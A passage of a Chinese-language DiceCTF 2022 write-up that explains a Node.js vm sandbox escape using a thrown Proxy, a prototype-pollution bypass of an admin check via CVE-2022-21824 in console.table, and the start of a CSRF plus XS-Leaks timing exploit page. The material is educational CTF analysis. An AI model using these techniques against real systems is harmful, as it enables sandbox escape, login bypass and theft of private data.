    <span class="token keyword">catch</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"index"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">result</span><span class="token operator">:</span> <span class="token string">"There was an error running your calculation!"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> result <span class="token operator">!==</span> <span class="token string">"number"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"index"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">result</span><span class="token operator">:</span> <span class="token string">"Nice try..."</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"index"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> result <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>而可以拿到 flag 的程式碼是這一段：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/admin"</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> <span class="token punctuation">&#123;</span> user<span class="token punctuation">,</span> pass <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>user <span class="token operator">||</span> <span class="token operator">!</span>pass <span class="token operator">||</span> <span class="token keyword">typeof</span> user <span class="token operator">!==</span> <span class="token string">"string"</span> <span class="token operator">||</span> <span class="token keyword">typeof</span> pass <span class="token operator">!==</span> <span class="token string">"string"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">"Missing username or password!"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">let</span> hash <span class="token operator">=</span> <span class="token function">sha256</span><span class="token punctuation">(</span>pass<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>users<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token parameter">u</span> <span class="token operator">=></span> u<span class="token punctuation">.</span>user <span class="token operator">===</span> user <span class="token operator">&amp;&amp;</span> u<span class="token punctuation">.</span>pass <span class="token operator">===</span> hash<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">flag</span><span class="token operator">:</span> <span class="token keyword">await</span> fsp<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">"Incorrect username or password!"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>有關於 VM escape，我所知道的都是根據這個檔案：<a target="_blank" rel="noopener" href="https://gist.github.com/jcreedcmu/4f6e6d4a649405a9c86bb076905696af">https://gist.github.com/jcreedcmu/4f6e6d4a649405a9c86bb076905696af</a></p>
<p>裡面有一些方式很有趣，例如說這一段：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">////////</span>
<span class="token comment">// Also, the vm code could throw an exception, with proxies on it.</span>

<span class="token keyword">const</span> code5 <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">throw new Proxy(&#123;&#125;, &#123;
  get: function(me, key) &#123;
	 const cc = arguments.callee.caller;
	 if (cc != null) &#123;
		(cc.constructor.constructor('console.log(sauce)'))();
	 &#125;
	 return me[key];
  &#125;
&#125;)</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>


<span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
  vm<span class="token punctuation">.</span><span class="token function">runInContext</span><span class="token punctuation">(</span>code5<span class="token punctuation">,</span> vm<span class="token punctuation">.</span><span class="token function">createContext</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">// The following prints out 'laser' twice, (as side-effects of e</span>
  <span class="token comment">// being converted to a string) followed by &#123;&#125;, which is the effect</span>
  <span class="token comment">// of the console.log actually *on* this line printing out the</span>
  <span class="token comment">// stringified value of the exception, which is in this case a</span>
  <span class="token comment">// (proxy-wrapped) empty object.</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>丟一個 proxy 出去當 exception，然後當有人對這個 exception 執行 toString 時，就會觸發到，就可以透過 <code>arguments.callee.caller</code> 拿到外界的 function。</p>
<p>不過這題並不是要你找 vm2 0 day，而是要利用一個 Node.js 1 day，利用 prototype pollution 來繞過這一段：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span><span class="token punctuation">(</span>users<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token parameter">u</span> <span class="token operator">=></span> u<span class="token punctuation">.</span>user <span class="token operator">===</span> user <span class="token operator">&amp;&amp;</span> u<span class="token punctuation">.</span>pass <span class="token operator">===</span> hash<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">flag</span><span class="token operator">:</span> <span class="token keyword">await</span> fsp<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>這個繞過我覺得也是很猛，照理來說 <code>users.filter</code> 因為沒條件符合，所以會返回空陣列，這時候通常都會檢查長度才對，這邊卻檢查第一個元素是不是 undefined。</p>
<p>這是因為如果有一個 prototype pollution 的漏洞，我們可以污染陣列的第一個屬性，那 <code>[][0]</code> 就會有東西，就可以讓 if 成立。</p>
<p>而這個漏洞編號為 <a target="_blank" rel="noopener" href="https://nodejs.org/en/blog/vulnerability/jan-2022-security-releases/#prototype-pollution-via-console-table-properties-low-cve-2022-21824">CVE-2022-21824</a>，利用方式是：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">table</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token literal-property property">x</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"__proto__"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>這個 API 第一個參數是資料，第二個參數是要顯示的欄位，像這樣：</p>
<p><img src="/img/dicectf2022/p2.png"></p>
<p>修復的 commit 是這一個：<a target="_blank" rel="noopener" href="https://github.com/nodejs/node/commit/3454e797137b1706b11ff2f6f7fb60263b39396b">https://github.com/nodejs/node/commit/3454e797137b1706b11ff2f6f7fb60263b39396b</a></p>
<p>從中可以得知是 <code>map</code> 這個 object 的問題，我們接著來看一下 <code>console.table</code> 的程式碼的重點部分：<a target="_blank" rel="noopener" href="https://github.com/nodejs/node/blob/3454e797137b1706b11ff2f6f7fb60263b39396b/lib/internal/console/constructor.js#L482">lib&#x2F;internal&#x2F;console&#x2F;constructor.js</a></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// tabularData 是第一個參數 [&#123;x:1&#125;]</span>
<span class="token comment">// properties 是第二個參數 ["__proto__"]</span>
<span class="token keyword">const</span> map <span class="token operator">=</span> <span class="token function">ObjectCreate</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> hasPrimitives <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> valuesKeyArray <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> indexKeyArray <span class="token operator">=</span> <span class="token function">ObjectKeys</span><span class="token punctuation">(</span>tabularData<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> indexKeyArray<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> item <span class="token operator">=</span> tabularData<span class="token punctuation">[</span>indexKeyArray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> primitive <span class="token operator">=</span> item <span class="token operator">===</span> <span class="token keyword">null</span> <span class="token operator">||</span>
      <span class="token punctuation">(</span><span class="token keyword">typeof</span> item <span class="token operator">!==</span> <span class="token string">'function'</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> item <span class="token operator">!==</span> <span class="token string">'object'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>properties <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">&amp;&amp;</span> primitive<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    hasPrimitives <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    valuesKeyArray<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">_inspect</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> keys <span class="token operator">=</span> properties <span class="token operator">||</span> <span class="token function">ObjectKeys</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">;</span>
	
    <span class="token comment">// for of 的時候 key 會是 __proto__ </span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> key <span class="token keyword">of</span> keys<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span>
        map<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
      
      <span class="token comment">// !ObjectPrototypeHasOwnProperty(item, key) 會成立</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>primitive <span class="token operator">&amp;&amp;</span> properties<span class="token punctuation">)</span> <span class="token operator">||</span>
           <span class="token operator">!</span><span class="token function">ObjectPrototypeHasOwnProperty</span><span class="token punctuation">(</span>item<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">)</span>

        <span class="token comment">// 因此 map[__proto__][0] 會是空字串</span>
        map<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
      <span class="token keyword">else</span>
        map<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">_inspect</span><span class="token punctuation">(</span>item<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>所以透過這個方式，可以污染 <code>Object.prototype[0]</code>，讓它變成空字串。</p>
<p>看來應該要 follow 一下 Node.js security updates，感覺滿多有用的資訊。</p>
<h2><span id="webx2fnotekeeper2-solves">web&#x2F;noteKeeper(2 solves)</span></h2><p>這題當時沒仔細看，先放著未來有機會再研究：<a target="_blank" rel="noopener" href="https://brycec.me/posts/dicectf_2022_writeups#notekeeper">https://brycec.me/posts/dicectf_2022_writeups#notekeeper</a></p>
<h2><span id="webx2fdicevault2-solves">web&#x2F;dicevault(2 solves)</span></h2><p>這題也沒仔細看，只知道是致敬另外一題：<a target="_blank" rel="noopener" href="http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html">http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html</a></p>
<p>作者解答：<a target="_blank" rel="noopener" href="https://hackmd.io/fmdfFQ2iS6yoVpbR3KCiqQ#webdicevault">https://hackmd.io/fmdfFQ2iS6yoVpbR3KCiqQ#webdicevault</a></p>
<h2><span id="webx2fcarrot1-solves">web&#x2F;carrot(1 solves)</span></h2><p>這題也很有趣，是個很簡單的 service，可以新增 note 跟搜尋，畫面如下：</p>
<p><img src="/img/dicectf2022/p3.png"></p>
<p>搜尋的時候會搜尋內容，有的話就會顯示，後端程式碼如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/tasks'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">tasks</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">'username'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>

    tasks <span class="token operator">=</span> db<span class="token punctuation">.</span>get<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'tasks'</span><span class="token punctuation">]</span>

    <span class="token keyword">if</span> <span class="token string">'search'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>args<span class="token punctuation">:</span>
        search <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">[</span><span class="token string">'search'</span><span class="token punctuation">]</span>
        tasks <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">filter</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> task<span class="token punctuation">:</span> search <span class="token keyword">in</span> task<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> tasks<span class="token punctuation">)</span><span class="token punctuation">)</span>

    tasks <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">sorted</span><span class="token punctuation">(</span>tasks<span class="token punctuation">,</span> key<span class="token operator">=</span><span class="token keyword">lambda</span> task<span class="token punctuation">:</span> <span class="token operator">-</span>task<span class="token punctuation">[</span><span class="token string">'priority'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'tasks.html'</span><span class="token punctuation">,</span> tasks<span class="token operator">=</span>tasks<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>flag 藏在 admin note 裡面，在啟動時會自動建立：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> <span class="token keyword">not</span> has<span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	password <span class="token operator">=</span> config<span class="token punctuation">.</span>ADMIN_PASSWORD
	
	put<span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
		<span class="token string">'tasks'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span>
			<span class="token string">'title'</span><span class="token punctuation">:</span> <span class="token string">'flag'</span><span class="token punctuation">,</span>
			<span class="token string">'content'</span><span class="token punctuation">:</span> os<span class="token punctuation">.</span>getenv<span class="token punctuation">(</span><span class="token string">'FLAG'</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">'dice&#123;flag&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
			<span class="token string">'priority'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
			<span class="token string">'id'</span><span class="token punctuation">:</span> <span class="token number">0</span>
		<span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
		<span class="token string">'password'</span><span class="token punctuation">:</span> bcrypt<span class="token punctuation">.</span>hashpw<span class="token punctuation">(</span>password<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> bcrypt<span class="token punctuation">.</span>gensalt<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>從 admin bot 的行為跟其他觀察看起來，就是個 XS-Leaks 的題目，只要能觀測到 search 的結果有沒有 flag 就行了，但難就難在想不出怎麼觀測。</p>
<p>這題官方沒有釋出而且似乎不會釋出解答（既然不釋出，可能是 Chrome 0 day 或是某個還沒修的 bug？），但賽後討論有人給了 XS-Leaks 的 exploit: <a target="_blank" rel="noopener" href="https://gist.github.com/kunte0/47c2b53535605d842f984e77d6c63eed">https://gist.github.com/kunte0/47c2b53535605d842f984e77d6c63eed</a></p>
<p>完整程式碼：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>DiceCTF 2022 web/carrot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Step 1: CSRF the admin user, to set a super long title for the flag note (LAX + POST form only possible for 2 minutes after cookies is created)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">csrf</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>do csrf<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Step 2: XS-Search with <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>connection-pool timing leak<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>, we have to use window.open (LAX cookie)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">popunder</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>open popup<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">exhaust_sockets</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>open 255 connections<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">oracle</span><span class="token punctuation">(</span><span class="token string">'dice&#123;abc'</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>test search "abc" (slow)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">oracle</span><span class="token punctuation">(</span><span class="token string">'dice&#123;xxx'</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>test search "xxx" (fast)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>output</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>x</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">display</span><span class="token punctuation">:</span>none<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>title<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>title<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>number<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>priority<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>priority<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>9999</span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span> <span class="token attr-name">rows</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>5<span class="token punctuation">"</span></span> <span class="token attr-name">cols</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>20<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
